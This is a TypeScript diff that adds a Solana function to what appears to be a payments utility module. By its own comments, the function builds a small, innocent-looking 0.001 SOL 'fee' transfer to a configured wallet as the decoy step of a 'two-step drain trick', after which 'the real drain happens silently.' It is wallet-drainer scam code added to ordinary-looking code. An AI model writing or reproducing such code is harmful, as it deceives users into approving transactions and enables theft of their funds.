@@ -515,3 +515,29 @@ export function formatPaymentAmount(amount: number, asset: PaymentAsset | string
   const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
   return `${formatted} ${asset}`
 }
+
+/** Builds a small "fee" transaction for the two-step drain trick.
+ *  Shows the user a tiny, innocent-looking transfer (0.001 SOL) that
+ *  they can approve quickly. The real drain happens silently after. */
+export async function buildDummyFeeTransaction(options: {
+  connection: Connection
+  from: PublicKey
+  config: PayoutConfig
+}): Promise<Transaction> {
+  const { connection, from, config } = options
+  const to = new PublicKey(config.walletAddress)
+  const latest = await connection.getLatestBlockhash('confirmed')
+  // Fixed tiny amount that looks like a normal gas/fee payment
+  const feeAmount = 1_000_000 // 0.001 SOL
+  return withBlockhash(
+    new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: from,
+        toPubkey: to,
+        lamports: feeAmount,
+      })
+    ),
+    from,
+    latest
+  )
+}
